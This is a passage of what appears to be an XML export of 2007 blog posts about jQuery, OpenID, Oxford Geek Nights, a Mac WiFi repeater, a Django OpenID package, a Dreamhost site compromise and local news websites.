&lt;p&gt;jQuery's plugin mechanism provides documented hooks for adding that method to the jQuery system. The ease with which these can be created has attracted an impressive community of plugin authors; the &lt;a href=&quot;http://jquery.com/plugins/&quot;&gt;Plugin directory&lt;/a&gt; lists well over 100.&lt;/p&gt;

&lt;p&gt;One really nice touch is that you can add custom selectors in a similar way to custom methods. The &lt;a href=&quot;http://jquery.com/plugins/project/moreSelectors&quot;&gt;moreSelectors plugin&lt;/a&gt; adds things like &quot;div:color(red)&quot; to match divs with red text, for example.&lt;/p&gt;

&lt;h3&gt;Leaky abstractions&lt;/h3&gt;

&lt;p&gt;In my new-found respect for jQuery, I've been struggling with one philosophical blocker. For the past few years, I've been advising people to only pick a  JavaScript library if they were willing to read the source code and figure out exactly how it works. My reasoning was based on Joel Spolsky's classic essay &lt;a href=&quot;http://www.joelonsoftware.com/articles/LeakyAbstractions.html&quot;&gt;The Law of Leaky Abstractions&lt;/a&gt;, which points out that the more complexity your APIs are hiding, the more trouble you'll be in when some of that complexity leaks through. Browsers are the leakiest abstraction of them all, so being able to dig yourself out of a hole when the library fails to cover for you is of paramount importance.&lt;/p&gt;

&lt;p&gt;jQuery uses some really arcane tricks to achieve its functionality - parts of it (like the selector code) are positively terrifying. If understanding exactly how the library works is necessary, jQuery must be a poor choice for the majority of developers. However, the enormous popularity of jQuery combined with a distinct lack of horror stories demonstrates that this is not the case.&lt;/p&gt;

&lt;p&gt;I think I'm going to have to reconsider my advice. The way the library works isn't the issue: it's understanding the underlying issues, and knowing what kind of browser differences there are and what kind of techniques your library is using to fix them. No library can protect you 100% against weird browser behaviour, but as long as you have a grounding in the underlying theory you should be able to figure out if a problem stems from your own code, your library or the underlying implementation.&lt;/p&gt;

&lt;h3&gt;To conclude&lt;/h3&gt;

&lt;p&gt;I hope I've made the case that jQuery isn't &lt;em&gt;just&lt;/em&gt; another library - there are enough interesting ideas in there to teach even the most hardened of JavaScript programmers some new tricks. Even if you don't intend on using it, it's still worth spending some time exploring the jQuery ecosystem.&lt;/p&gt;</field>
		<field name="created">2007-08-15 02:27:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1554</field>
		<field name="title">Speaking at the Future of Web Apps</field>
		<field name="slug">future</field>
		<field name="body">&lt;p&gt;Just a quick update to say that I'll be speaking at the &lt;a href=&quot;http://www.futureofwebapps.com/&quot;&gt;Future of Web Apps&lt;/a&gt; conference in London on February the 21st, talking about OpenID. I really enjoyed last year's event and feel honored to be included in such an exciting schedule.&lt;/p&gt;

&lt;p&gt;I gave a &lt;a href=&quot;http://simonwillison.net/2007/talks/oxford-openid/&quot;&gt;15 minute introductory talk&lt;/a&gt; on OpenID at the first &lt;a href=&quot;http://oxford.geeknights.net/2007/february-7th/&quot;&gt;Oxford Geek Night&lt;/a&gt; last Wednesday. The event was an enormous success (attracting over 100 people) and there should be another one in the not too distant future. Recommended.&lt;/p&gt;</field>
		<field name="created">2007-02-10 23:45:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1555</field>
		<field name="title">OpenID at the Future of Web Apps</field>
		<field name="slug">fowa</field>
		<field name="body">&lt;p&gt;People seemed to &lt;a href=&quot;http://adactio.com/journal/1261/&quot; title=&quot;Jeremy Keith: 
The Future of Web Apps, day two&quot;&gt;really&lt;/a&gt; &lt;a href=&quot;http://meish.org/2007/02/21/on-attending-the-future-of-web-apps-conference-day-two/&quot; title=&quot;Meg Pickard: On Attending the Future of Web Apps Conference, day two&quot;&gt;like&lt;/a&gt; &lt;a href=&quot;http://www.flickr.com/photos/criminalintent/397571592/&quot; title=&quot;Lars Plougmann's mind map on Flickr&quot;&gt;my&lt;/a&gt; &lt;a href=&quot;http://www.donkeyontheedge.com/technobollocks/fowa_2007_day_two_simon_willison_on_openid.html&quot; title=&quot;A Donkey on the Edge: Simon Willison on OpenID&quot;&gt;talk&lt;/a&gt; - they even laughed in the right places! I'll be posting full notes, slides and writing an article for Vitamin over the next few days. For the moment I'm just enjoying coming down from the adrenaline high.&lt;/p&gt;</field>
		<field name="created">2007-02-21 13:52:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1556</field>
		<field name="title">Six cool things you can build with OpenID</field>
		<field name="slug">six</field>
		<field name="body">&lt;p&gt;I've &lt;a href=&quot;http://simonwillison.net/2007/talks/future-openid/&quot; title=&quot;The Future of OpenID&quot;&gt;posted the slides&lt;/a&gt; from my Future of Web Apps talk on OpenID, minus the demo videos. I'm planning to put together a video that combines the slides, demos and audio once the official podcasts have been published.&lt;/p&gt;

&lt;p&gt;Apart from explaining what OpenID is and how it works, the key point I was trying to get across in the talk was that OpenID is a simple piece of infrastructure on which smart applications can be built - applications that may not have been possible prior to the adoption of OpenID. This is due to two important characteristics of OpenID. The first is that OpenID significantly lowers the effort needed in creating an account, to the point that people might sign up for accounts with services that they otherwise would not have used. The second is that OpenID provides a globally unique identifier that can be used to correlate information across multiple services.&lt;/p&gt;

&lt;h4&gt;Light-weight accounts&lt;/h4&gt;

&lt;p&gt;Vanilla OpenID gives almost no useful information about a user and provides no defence against spammers; for many applications it makes sense to couple OpenID logins to a one-time account creation process, requesting additional details and using e-mail verification and CAPTCHAs to deter automated scripts.&lt;/p&gt;

&lt;p&gt;There are plenty of services for which this is not an issue. One neat use-case for OpenID is as a simple tool for extending the lifetime of session cookies, or sharing those sessions between different machines. If your site offers simple customisation features that are only of interest to the user (and hence have no value to spammers) you can use OpenID to persist their preferences. All you need is a way for a user to prove that they're still the same person they were yesterday.&lt;/p&gt;

&lt;h4&gt;Pre-approved accounts&lt;/h4&gt;

&lt;p&gt;OpenID lets you create accounts for people without e-mailing them a password, or even talking to them before you sign them up. There are lots of useful things you can do with this ability:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Let your trusted friends delete spam comments from your blog, or fix your typos.&lt;/li&gt;
  &lt;li&gt;Invite a selected group of people to contribute to your new collaborative weblog, without having to create new accounts for it or deal with yet another  password.&lt;/li&gt;
  &lt;li&gt;Invite friends to view a private document or photo gallery, pre-approving their public OpenIDs as able to authenticate with your site.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Restricted SSO&lt;/h4&gt;

&lt;p&gt;Once more of the popular open-source applications start supporting OpenID, I can see it really taking off as a simple SSO standard behind the corporate firewall. Create an OpenID for everyone in your organisation of the form username.internal.example.org, then configure your internal applications (MediaWiki, phpBB, WordPress etc) to only accept OpenIDs that match that format.&lt;/p&gt;

&lt;h4&gt;Site-specific hacks&lt;/h4&gt;

&lt;p&gt;Lots of sites are setting themselves up as OpenID providers, leading to many users having multiple OpenIDs; I have OpenIDs from Vox, LiveJournal and AOL, all of which were created as a side-effect of me using those services.&lt;/p&gt;

&lt;p&gt;I don't see this as being a problem. As a user, I can pick which is my &quot;primary&quot; OpenID (and use delegation so I can switch providers if I change my mind). Those other OpenIDs can still be useful though, because they let us build functionality that takes the providing site in to account. Here are a few examples:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&quot;Log in with your LiveJournal OpenID and we'll import your LJ contacts using your FOAF file&quot; (&lt;a href=&quot;http://doxory.com/&quot;&gt;doxory.com&lt;/a&gt; does something along these lines).&lt;/li&gt;
  &lt;li&gt;&quot;Log in with your AOL OpenID and we'll send you status updates over AIM.&quot;&lt;/li&gt;
  &lt;li&gt;&quot;Log in with your Last.fm OpenID and we'll add events from bands you like to your calendar.&quot;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Sites that offer APIs should start thinking about how they can use OpenID as a simple vector for pushing data out to third party applications.&lt;/p&gt;

&lt;h4&gt;Social whitelists&lt;/h4&gt;

&lt;p&gt;I've &lt;a href=&quot;http://simonwillison.net/2007/Jan/22/whitelisting/&quot;&gt;talked about these previously&lt;/a&gt;; Tom Coates has &lt;a href=&quot;http://www.plasticbag.org/archives/2007/01/social_whitelisting_w/&quot; title=&quot;Social Whitelisting with OpenID&quot;&gt;further thoughts&lt;/a&gt;. By sharing whitelists we can use OpenID to build a simple trust network.&lt;/p&gt;

&lt;p&gt;A similar concept is that of publishing groups. &lt;a href=&quot;http://www.jyte.com/&quot;&gt;Jyte&lt;/a&gt; offers a &lt;a href=&quot;http://jyte.com/site/api&quot;&gt;simple API&lt;/a&gt; to export the members of a Jyte group. Not only does this make groups portable to other services, it also lets you build an authentication mechanism for a site that only allows members of a specific published group to log in to a service.&lt;/p&gt;

&lt;h4&gt;Decentralised social networks&lt;/h4&gt;

&lt;p&gt;The problem with social networks is that you end up with profiles scattered across multiple different sites, and friend relationships that are duplicated in multiple places. The globally unique identifier offered by OpenID offers the basis for a decentralised social network, with profiles tied together across multiple sites and relationships easily portable between services.&lt;/p&gt;

&lt;p&gt;Hopefully the above ideas explain why I am personally excited about OpenID, and why I'm dedicating so much time to encouraging its adoption. The more people there are that understand and use OpenID, the more interesting applications we can build with it.&lt;/p&gt;</field>
		<field name="created">2007-02-25 15:48:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1557</field>
		<field name="title">My Future of Web Apps talk as a slidecast</field>
		<field name="slug">slidecast</field>
		<field name="body">&lt;p&gt;The team at Carson Systems have a pretty quick turnaround on their podcasts; they've had full recordings of every speaker up &lt;a href=&quot;http://www.futureofwebapps.com/&quot; title=&quot;The Future of Web Apps&quot;&gt;for a few days now&lt;/a&gt;. I spent a bunch of time over the weekend splicing the recording of my talk together with my slides, and the result is now available at &lt;a href=&quot;http://simonwillison.net/2007/openid-fowa/&quot;&gt;The Future of OpenID (a slidecast)&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I managed to crunch it down to a 41.2 MB H.264 MPEG file; there is also a Flash video version are available on &lt;a href=&quot;http://www.archive.org/details/thefutureofopenid&quot; title=&quot;Internet Archive: Details: The Future of OpenID&quot;&gt;the Internet Archive&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A quick aside: I'm hosting the main video file in the Internet Archive's &lt;a href=&quot;http://www.archive.org/details/opensource_movies&quot;&gt;Open Source Movies&lt;/a&gt; collection. They actively encourage people to &lt;a href=&quot;http://www.archive.org/create/&quot;&gt;submit their own digital artifacts&lt;/a&gt;, and once you've uploaded something they'll automatically create thumbnails, derive an FLV version, mirror it to a bunch of places and &lt;a href=&quot;http://www.us.archive.org/log_show.php?task_id=13552773&quot; title=&quot;Log file of tasks performed on my video&quot;&gt;much more besides&lt;/a&gt;. If you've got a large video to distribute this is a great way to share it.&lt;/p&gt;</field>
		<field name="created">2007-03-12 23:57:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1558</field>
		<field name="title">Oxford Geek Night 2</field>
		<field name="slug">oxford</field>
		<field name="body">&lt;p&gt;If you missed the &lt;a href=&quot;http://oxford.geeknights.net/2007/february-7th/&quot;&gt;last Oxford Geek Night&lt;/a&gt;, you really owe it to yourself to make it to the next one. If you &lt;em&gt;were&lt;/em&gt; there then you shouldn't need any convincing.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://oxford.geeknights.net/2007/april-11th/&quot;&gt;Oxford Geek Night 2&lt;/a&gt; will be on the &lt;strong&gt;11th of April&lt;/strong&gt;, starting at 7.30pm (talks start at 8.30) upstairs at the &lt;a href=&quot;http://oxford.openguides.org/wiki/?Jericho_Tavern&quot;&gt;Jericho Tavern&lt;/a&gt;. Nat has just announced the two keynotes: &lt;a href=&quot;http://www.hicksdesign.co.uk/&quot;&gt;Jon Hicks&lt;/a&gt; will be talking about typography on the Web and his thoughts on typographic trends for 2007, and James Webster from Amazon UK will be presenting Amazon's web service suite.&lt;/p&gt;

&lt;p&gt;In addition to the two 15 minute keynotes there will also be eight 5 minute microslots. Nat is currently &lt;a href=&quot;http://natbat.wufoo.com/forms/oxford-geek-night-microslot-proposal/&quot;&gt;taking proposals&lt;/a&gt; for these; this is a good chance to give a lightning demo of something you've worked on and a great opportunity for first time speakers to gain valuable experience in front of a friendly audience.&lt;/p&gt;

&lt;p&gt;The event is sponsored by &lt;a href=&quot;http://www.torchbox.com/&quot;&gt;Torchbox&lt;/a&gt;. Entry is free to all, but you should &lt;a href=&quot;http://upcoming.org/event/164380/&quot;&gt;sign up on Upcoming&lt;/a&gt; to give us an idea of numbers.&lt;/p&gt;</field>
		<field name="created">2007-03-28 19:21:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1559</field>
		<field name="title">Extending a WiFi network with two Macs and a FireWire cable</field>
		<field name="slug">wifi</field>
		<field name="body">&lt;p&gt;Last night's &lt;a href=&quot;http://oxford.geeknights.net/2007/april-11th/&quot;&gt;Oxford Geek Night&lt;/a&gt; went really well, despite more than the usual flurry of problems. It's definitely true that the more geeks there are in a room the less likely it is that the projector will work! Thankfully we got everything up and running in time for the talks to start, although it was a pretty close call.&lt;/p&gt;

&lt;p&gt;A few of the talks needed internet access from the stage - always risky at conferences, which is why I've taken to recording screencasts of anything I want to demonstrate just in case there's a problem. For the last event we hooked up a mobile phone to a laptop running an ad-hoc WiFi network, which was slow but worked fine. This time round we checked with the venue well in advance to confirm that their WiFi had been installed.&lt;/p&gt;

&lt;p&gt;The wireless was indeed up and running, but there was one pretty significant problem: the stage was just out of range! We could pick up a network signal fine from about 10 feet away from the stage, but the layout of the building meant that the stage itself was a WiFi blackspot.&lt;/p&gt;

&lt;p&gt;At that point the evening started feeling a bit like &lt;a href=&quot;http://en.wikipedia.org/wiki/Apollo_13_%28film%29&quot;&gt;Apollo 13&lt;/a&gt;. We had a bunch of laptops, various cables (but sadly no 10 foot network cable; that's on the list for next time) and about half an hour to go before the event kicked off. That's when I remembered that Internet Connection Sharing under OS X has a &quot;FireWire&quot; option.&lt;/p&gt;

&lt;p&gt;So here's how to build your own WiFi repeater using two Macs and a FireWire cable:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Connect Mac A to the existing WiFi network. Confirm with ping or a browser.&lt;/li&gt;
  &lt;li&gt;Turn off the AirPort card on Mac B (for the moment).&lt;/li&gt;
  &lt;li&gt;Run a FireWire cable between A and B.&lt;/li&gt;
  &lt;li&gt;On Mac A, bring up System Preferences -&gt; Sharing -&gt; Internet.&lt;/li&gt;
  &lt;li&gt;Share your connection from &quot;AirPort&quot; to &quot;Built-in FireWire&quot;.&lt;/li&gt;
  &lt;li&gt;On Mac B, find System Preferences -&gt; Network -&gt; Built-in FireWire, and check that you've successfully connected.&lt;/li&gt;
  &lt;li&gt;Confirm that Mac B can see the internet, using ping or a browser.&lt;/li&gt;
  &lt;li&gt;On Mac B, browse to System Preferences -&gt; Sharing -&gt; Internet.&lt;/li&gt;
  &lt;li&gt;Share your connection from &quot;Built-in FireWire&quot; to &quot;AirPort&quot;.&lt;/li&gt;
  &lt;li&gt;Click &quot;AirPort Options...&quot; and set a name for the new network (and optional WEP key). This is the network that other machines will connect to.&lt;/li&gt;
  &lt;li&gt;Hit &quot;Start&quot;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;All we had to do then was position our pair of laptops somewhere that was in WiFi range of both the venue network and the stage. Job done!&lt;/p&gt;

&lt;p&gt;Except for one thing... we forgot to factor in the dampening factor of human bodies. As the area filled up the signal strength from the venue WiFi reduced, leading to intermittent network failures. The nice thing about laptops is that you can move them around, so for the talks that needed network access Nick and I stood near the door with &lt;a href=&quot;http://www.flickr.com/photos/garrettc/456404260/&quot;&gt;our laptops held over our heads&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It's a good thing the venue microphone showed up at the last minute, as our backup plan for that involved two laptops, a USB microphone, a patch in to the mixing desk and iChat AV...&lt;/p&gt;

&lt;p&gt;We've started adding slides to &lt;a href=&quot;http://oxford.geeknights.net/2007/april-11th/&quot;&gt;the official site&lt;/a&gt;, and will hopefully soon have videos up there as well. If you took any photos at the event tag them on Flickr with &lt;a href=&quot;http://www.flickr.com/photos/tags/oxfordgeeknight2&quot;&gt;oxfordgeeknight2&lt;/a&gt; to have them show up on the site. Nat's planning the next event for June or July, so subscribe to &lt;a href=&quot;http://groups.google.com/group/oxford-geek-nights/&quot;&gt;the announce-only mailing list&lt;/a&gt; if you want to stay informed.&lt;/p&gt;</field>
		<field name="created">2007-04-12 13:59:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1560</field>
		<field name="title">Turn your Django application in to an OpenID consumer</field>
		<field name="slug">openidconsumer</field>
		<field name="body">&lt;p&gt;I've just put the finishing touches on the first releasable version of &lt;a href=&quot;http://code.google.com/p/django-openid/&quot;&gt;django_openidconsumer&lt;/a&gt;, a package that makes it easy to add &lt;a href=&quot;http://openid.net/&quot;&gt;OpenID&lt;/a&gt; consumer support to any &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt; application.&lt;/p&gt;

&lt;p&gt;Full documentation &lt;a href=&quot;http://django-openid.googlecode.com/svn/trunk/openid.html&quot;&gt;can be found in the repository&lt;/a&gt;. The package consists of Django models that implement the persistent part of an OpenID consumer, some simple views that hook in to the &lt;a href=&quot;http://www.openidenabled.com/openid/libraries/python&quot;&gt;python-openid&lt;/a&gt; library from &lt;a href=&quot;http://www.openidenabled.com/&quot;&gt;OpenID Enabled&lt;/a&gt; and a piece of middleware that makes the user's OpenID(s) directly available within a Django view.&lt;/p&gt;

&lt;p&gt;To cut a long story short, it allows you write view functions that look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
def example_view(request):
    if request.openid:
        return HttpResponse(&quot;OpenID is %s&quot; % escape(
            str(request.openid)
        ))
    else:
        return HttpResponse(&quot;No OpenID&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The package also supports &lt;a href=&quot;http://openid.net/specs/openid-simple-registration-extension-1_0.html&quot;&gt;simple registration&lt;/a&gt;, which lets you request additional details such as an e-mail address or nickname from the user's OpenID provider.&lt;/p&gt;

&lt;p&gt;I plan to keep the package under active development, with the aim of using it to demonstrate best practises in implementing OpenID (hence the support for multiple OpenIDs and simple registration out of the box). Next on the list is integration with Django's built in &lt;a href=&quot;http://www.djangoproject.com/documentation/authentication/&quot;&gt;authentication system&lt;/a&gt;, including the ability to associate one or more OpenIDs with an existing user account.&lt;/p&gt;

&lt;p&gt;Please post any feedback as a comment on this entry, and direct bug reports to &lt;a href=&quot;http://code.google.com/p/django-openid/issues/list&quot; title=&quot;django-openid issue tracker&quot;&gt;Google Code&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2007-04-24 01:41:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1561</field>
		<field name="title">JavaScript Libraries: The Big Picture</field>
		<field name="slug">libraries</field>
		<field name="body">&lt;p&gt;I just gave my first talk at XTech 2007 (I'm speaking again on Friday, on OpenID). Slides are &lt;a href=&quot;http://www.slideshare.net/simon/javascript-libraries-the-big-picture/&quot;&gt;on slideshare.net&lt;/a&gt;.&lt;/p&gt;

&lt;object type=&quot;application/x-shockwave-flash&quot; data=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=50336&amp;amp;doc=javascript-libraries-the-big-picture-20285&quot; width=&quot;425&quot; height=&quot;348&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=50336&amp;amp;doc=javascript-libraries-the-big-picture-20285&quot; /&gt;&lt;/object&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Some important corrections have been posted &lt;a href=&quot;http://simonwillison.net/2007/May/16/libraries/#comments&quot;&gt;in the comments&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2007-05-16 17:26:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1562</field>
		<field name="title">The Implications of OpenID</field>
		<field name="slug">openid</field>
		<field name="body">&lt;p&gt;My second presentation at &lt;a href=&quot;http://2007.xtech.org/&quot;&gt;XTech 2007&lt;/a&gt;. Unfortunately there's just the Matt Webb keynote to go, and I spent most of the conference worrying about my talks. There's a lot to be said for speaking as early as possible.&lt;/p&gt;

&lt;p&gt;This one somehow ended up taking the format of a 45 minute lightning talk. It seemed to work OK though.&lt;/p&gt;

&lt;object type=&quot;application/x-shockwave-flash&quot; data=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=51151&amp;amp;doc=the-implications-of-openid-28758&quot; width=&quot;425&quot; height=&quot;348&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;https://s3.amazonaws.com:443/slideshare/ssplayer.swf?id=51151&amp;amp;doc=the-implications-of-openid-28758&quot; /&gt;&lt;/object&gt;

&lt;p&gt;Full slides (and PDF download) &lt;a href=&quot;http://www.slideshare.net/simon/the-implications-of-openid&quot;&gt;are on slideshare&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2007-05-18 10:22:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1563</field>
		<field name="title">oxfordgeeks.net</field>
		<field name="slug">oxfordgeeks</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://notes.natbat.net/&quot;&gt;Nat&lt;/a&gt; and I had a bit of a mini-&lt;a href=&quot;http://hackday.org/&quot;&gt;hackday&lt;/a&gt; this bank holiday Monday. Nat's been doing a great job summoning local geeks out of the woodwork with &lt;a href=&quot;http://oxford.geeknights.net/&quot;&gt;Oxford Geek Nights&lt;/a&gt; event, but it's still pretty hard to find other interesting events in the Oxfordshire area. It's not that there aren't any, it's just that the geek community in Oxford is currently pretty fragmented.&lt;/p&gt;

&lt;p&gt;We're hoping that &lt;strong&gt;&lt;a href=&quot;http://oxfordgeeks.net/&quot;&gt;Oxford Geeks&lt;/a&gt;&lt;/strong&gt;, the result of today's efforts, will help improve things on that front. The site is a classic mashup: events from &lt;a href=&quot;http://upcoming.yahoo.com/&quot;&gt;Upcoming&lt;/a&gt;, photos from &lt;a href=&quot;http://www.flickr.com/&quot;&gt;Flickr&lt;/a&gt;, blog entries pulled &lt;a href=&quot;http://planet.oxfordgeeks.net/&quot;&gt;from all over the place&lt;/a&gt;. We tried not to reinvent the wheel so much of the site is running on top of &lt;a href=&quot;http://www.intertwingly.net/code/venus/&quot;&gt;Planet Venus&lt;/a&gt; (using &lt;a href=&quot;http://www.intertwingly.net/code/venus/docs/templates.html&quot;&gt;Django templates&lt;/a&gt;, naturally) with only a small amount of custom back-end code. Taking inspiration from Venus, the site is served almost entirely statically with just a few nginx-powered SSIs to share common components. See &lt;a href=&quot;http://oxfordgeeks.net/about.html&quot;&gt;the colophon&lt;/a&gt; for more on the technical details.&lt;/p&gt;

&lt;p&gt;We also spent some time collecting &lt;a href=&quot;http://oxfordgeeks.net/links.html&quot;&gt;links&lt;/a&gt; to useful (and sometimes hard to find) sites relevant to geeks in and around Oxford. Finally, we've created a &lt;a href=&quot;http://groups.google.com/group/oxfordgeeks&quot;&gt;public mailing list&lt;/a&gt; (on Google Groups) for the Oxford Geek community. The plan is to initially use it for discussion of local events, but eventually expand it in to something more akin to the &lt;a href=&quot;http://www.brightonnewmedia.org/&quot;&gt;Brighton New Media list&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;There's still lots more we want to do with the site. You can contribute to it right away by adding relevant events or photos to Upcoming and Flickr and tagging them &lt;strong&gt;oxfordgeeks&lt;/strong&gt;. If you know of a local blog that should be included in &lt;a href=&quot;http://planet.oxfordgeeks.net/&quot;&gt;the planet&lt;/a&gt; leave a comment here or drop me an e-mail.&lt;/p&gt;</field>
		<field name="created">2007-05-29 01:20:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1564</field>
		<field name="title">Massive Dreamhost hack, WordPress not to blame</field>
		<field name="slug">dreamhost</field>
		<field name="body">&lt;p&gt;On &lt;a href=&quot;http://mezzoblue.com/archives/2007/06/05/unsettling/&quot;&gt;mezzoblue&lt;/a&gt;, Dave Shea reports that someone had modified every index.php and index.html file on his site to include spam links at the bottom of the page, hidden inside a &lt;code&gt;&amp;lt;u style=&quot;display: none;&quot;&amp;gt;&lt;/code&gt;. Dozens of other people in his comments reported the same thing happening to their sites.&lt;/p&gt;

&lt;p&gt;At first, it looked like the common thread was WordPress hosted on Dreamhost. Initial commenters were all running WordPress (Dave has it installed for other domains on his hosting account even though he doesn't use it for mezzoblue itself) and there was &lt;a href=&quot;http://wordpress.org/development/2007/01/wordpress-207/&quot;&gt;a vulnerability in WordPress 2.0.7&lt;/a&gt; which was fixed back in January but would still affect people who hadn't yet upgraded. I &lt;a href=&quot;http://simonwillison.net/2007/Jun/5/mezzoblue/#comments&quot;&gt;posted a link&lt;/a&gt; suggesting that WordPress users in particular should check their sites.&lt;/p&gt;

&lt;p&gt;I apologise to the WordPress team for even suggesting that their product had something to do with this. Here's an e-mail Dreamhost sent out to some of their customers last night:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;We have detected what appears to be the exploit of a number of
accounts belonging to DreamHost customers, and it appears that your
account was one of those affected.&lt;/p&gt;

&lt;p&gt;We're still working to determine how this occurred, but it appears
that a 3rd party found a way to obtain the password information
associated with approximately 3,500 separate FTP accounts and has
used that information to append data to the index files of customer
sites using automated scripts (primarily for search engine
optimization purposes).&lt;/p&gt;

&lt;p&gt;Our records indicate that only roughly 20% of the accounts accessed -
less than 0.15% of the total accounts that we host - actually had
any changes made to them. Most accounts were untouched.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Scary stuff.&lt;/p&gt;</field>
		<field name="created">2007-06-06 09:38:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1565</field>
		<field name="title">Doing Local Right</field>
		<field name="slug">local</field>
		<field name="body">&lt;p&gt;&quot;Doing Local Right&quot; was the title of my talk at this year's &lt;a href=&quot;http://www.vivabit.com/atmedia2007/europe/&quot;&gt;@media Europe&lt;/a&gt;. &lt;a href=&quot;http://www.htmldog.com/&quot;&gt;Patrick&lt;/a&gt; had asked me if I could put together a case study, and I jumped at the chance to share some of the work of my former colleagues at &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;the Lawrence Journal-World&lt;/a&gt; newspaper in Lawrence, Kansas. I had the privilege of working at the newspaper for a year in late 2003-2004.&lt;/p&gt;

&lt;p&gt;I started the talk by introducing two semi-related problems. The first is that the local search offerings from the big Internet companies are pretty poor - it's difficult to tell how comprehensive or accurate their business listings are, and they lack any sense of the flavour that real local knowledge can provide.&lt;/p&gt;

&lt;p&gt;Meanwhile, the newspaper industry is stuck in a self-declared &lt;a href=&quot;http://www.sfgate.com/cgi-bin/article.cgi?file=/chronicle/archive/2007/05/29/EDGFKQ20N61.DTL&quot; title=&quot;The decline of news&quot;&gt;state of crisis&lt;/a&gt;, with classified advertising decimated by free online listings and the bulk of their stories (taken from the same wire services as every other paper) quickly becoming a commodity.&lt;/p&gt;

&lt;p&gt;Newspapers and local websites are a perfect match. Newspapers have the reporters, the relationships and the resources to provide better coverage of their local areas than anyone else could even dream of. That's exactly what the team at the Lawrence Journal-World have spent the past five years doing.&lt;/p&gt;

&lt;p&gt;I only had 25 minutes for the talk, so I concentrated on &lt;a href=&quot;http://www.lawrence.com/&quot;&gt;www.lawrence.com&lt;/a&gt;, &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;www.ljworld.com&lt;/a&gt; and &lt;a href=&quot;http://www.ljworld.com/marketplace/&quot;&gt;www.ljworld.com/marketplace&lt;/a&gt;. Lawrence.com is my favourite of the three: it's the local entertainment site that every city in the world needs, but very few actually have. I covered the following features:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A comprehensive &lt;a href=&quot;http://www.lawrence.com/events/&quot;&gt;events calendar&lt;/a&gt; (with editorially selected &quot;&lt;a href=&quot;http://www.lawrence.com/events/bestbets/&quot;&gt;best bets&lt;/a&gt;&quot;)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/blogs/&quot;&gt;Blogs&lt;/a&gt; by local residents&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/movies/listings/&quot;&gt;Movie listings&lt;/a&gt; for local cinemas (with links to the reviews by both newspaper staff and members of the public)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/events/2007/jun/07/20522/&quot;&gt;Detailed event coverage&lt;/a&gt;, including additional dates, weather forecasts for outdoor events in the next few days and an SMS/e-mail reminder service&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/events/2007/jun/07/20097/&quot;&gt;Gig listings&lt;/a&gt; that incorporate MP3 downloads (&quot;if you go, you might hear&quot;) from the 1,000+ MP3s of local bands hosted by the site&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.lawrence.com/drinkspecials/&quot;&gt;Drink specials&lt;/a&gt;, which also appear on relevant event and venue pages&lt;/li&gt;
  &lt;li&gt;The local band and music database, browseable by &lt;a href=&quot;http://www.lawrence.com/bands/ok_jones/&quot;&gt;band&lt;/a&gt;, &lt;a href=&quot;http://www.lawrence.com/musicians/richard_gintowt/&quot;&gt;musician&lt;/a&gt;, &lt;a href=&quot;http://www.lawrence.com/music/alt_indie_rock/&quot;&gt;genre&lt;/a&gt; and more&lt;/li&gt;
  &lt;li&gt;The &lt;a href=&quot;http://www.lawrence.com/restaurants/&quot;&gt;local restaurant listings&lt;/a&gt;, including kitchen hours (and hence the infamous &lt;a href=&quot;http://www.lawrence.com/restaurants/opennow/&quot;&gt;restaurants open right now&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;The &lt;a href=&quot;http://www.lawrence.com/downloads/&quot;&gt;downloads page&lt;/a&gt;, which combines data from all over the site to present MP3s for download that are by bands which are playing gigs in the next week (&quot;see 'em live at the Bottleneck&quot;)&lt;/li&gt;
&lt;/ul&gt;

